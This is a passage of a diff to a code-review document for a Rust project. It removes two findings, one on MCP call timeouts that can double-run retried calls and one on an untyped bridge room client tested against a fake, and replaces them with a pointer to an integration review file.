-- Where: `mcp/src/lib.rs:157-162,306-316`; `mcp/src/wire.rs:200-220`; `harnessd/src/mcp.rs:137`; `bridge/src/fleet.rs:186-214`; `bridge/src/tools.rs:869-876`; rano `src/plugin.rs:137-163`; `plugins-rano/src/lib.rs:43,182,202-210,229-303`; `tui/src/app/cards_plugin.rs:156-205`.
-- Claim:
-  - An MCP call holds the link mutex for up to 60 seconds. A timeout sends no `notifications/cancelled`, so a retried call runs twice (A10-F8).
-  - The bridge's `prompt_once` reports "did not take the prompt" while its thread keeps prompting, so a retry runs the text twice (A8-F3). Same root: a timeout with no cancel.
-  - Plugin calls have fuel limits and no wall-clock deadline, behind a process-wide module mutex (A10-F17).
-  - The sandbox boundary, the `card_item`/`card_call` paths and MCP mounting have no letibot tests (A10-F11, A10-F12, A10-F14).
-- Change: on timeout, cancel, mark the result "may have run", and never say "did not". Dedup by a client-minted prompt id. Add an epoch deadline. Add the tests.
-- Sources: A10-F8, A10-F11, A10-F12, A10-F14, A10-F17, A8-F3. A10 and A8 as listed, DeepSeek (supplementary).
-- Test: `a_timed_out_mcp_call_is_cancelled_not_retried_blind`, and `prompt_once_timeout_does_not_double_submit`.
-
-### I99. The bridge is a second, untyped room client, tested against a fake
-- Status: UNVERIFIED. Severity: medium.
-- Where: `bridge/src/rooms.rs:117-128,199-203,270-346,400-414,525-577,800-875,945-971,1285-1303,2000-2001,2059`; `room/src/chat.rs:395-398`; `room/src/server.rs:26-35,1722-1730,3634-3637`; `bridge/src/push.rs:296-307`; `plugin-sdk/src/push.rs:29-32`; `harnessd/src/room/wake.rs:479-487`; `bridge/tests/room_tools.rs:15,164-357`; `room/src/client.rs:141-301,369-370`.
-- Claim:
-  - Its private `reach` maps every fyi to `passing`, breaking the plugin contract (A8-F5).
-  - `delivered()` recomputes `names_you`, the bug `wake.rs` already fixed (A8-F10).
-  - `suffixed` truncation breaks `family_of` for handles over 28 chars (A8-F6).
-  - Host key, socket path and data dir are copies, with a `.` fallback (A8-F9).
-  - Ack and replay tests run only against a fake coordinator (A8-F4).
-  - It speaks `serde_json::Value` instead of `letibot_room::Request` (A8-F15).
-- Change: patch now (decision on C14). Use `letibot_room::Message::reach` and the frame's `names_you`. Suffix the name part. Call `letibot_room::{host_key, socket_path}`. Port the ack, pending, redial and replay tests to `Server::serve`. Add a test that deserialises the fake's recorded frames as `Request`. Follow-up: rebuild `RoomLink` on `Client`.
-- Sources: A8 as listed. A8 r1 GLM, A8 r1 fable, A8 r1 Kimi, A8 r2 opus, A8 r2 DeepSeek, A8 r2 sonnet, DeepSeek (supplementary).
-- Test: `a_named_fyi_reaches_a_push_layer_as_addressed`, `a_long_folder_twin_keeps_its_family`, and `bridge_and_daemon_dial_the_same_room_socket`.
+**Findings.** I96, I97, I99, verbatim in `docs/review/2026-11-16/INTEGRATION.md`.
 
 ## R349 - extensions and policy remainder: queue briefing, flowy cleartext, provider error classes, rano heredoc edits
 
